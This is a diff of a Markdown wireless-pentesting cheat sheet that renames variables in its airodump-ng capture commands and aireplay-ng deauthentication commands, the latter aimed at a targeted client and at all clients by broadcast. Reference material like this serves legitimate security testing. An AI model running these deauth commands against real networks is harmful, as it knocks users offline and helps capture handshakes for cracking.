@@ -108,11 +108,11 @@ iwlist wlan0 frequency | grep Current
 ### airodump-ng
 
 ```bash
-airodump-ng $interface            # Start capture
-airodump-ng -c 6,11 $interface    # channel 6 and 11
+airodump-ng $INTERFACE            # Start capture
+airodump-ng -c 6,11 $INTERFACE    # channel 6 and 11
 airodump-ng --band a              # a: 5GHz
 airodump-ng --band bg             # b: 2,4GHz (11 Mbps) | g: 2,4GHz (54 Mbps)
-airodump-ng -w capture $interface # Save to file
+airodump-ng -w capture $INTERFACE # Save to file
 ```
 
 ## Aircrack-ng Suite
@@ -120,14 +120,14 @@ airodump-ng -w capture $interface # Save to file
 ::: code-group
 
 ```bash [aireplay-ng]
-# Deauthentication (transverse attack)
-aireplay-ng -0 <packets> -a $bssid -c $client_mac $interface
+# Deauthentication (targeted client)
+aireplay-ng -0 <packets> -a $BSSID -c $CLIENT_MAC $INTERFACE
 
 # Broadcast deauth
-aireplay-ng -0 <packets> -a $bssid $interface
+aireplay-ng -0 <packets> -a $BSSID $INTERFACE
 
 # Disable AP detection
-aireplay-ng -0 <packets> -a $bssid -D $interface
+aireplay-ng -0 <packets> -a $BSSID -D $INTERFACE
 ```
 
 ```bash [airgraph-ng]
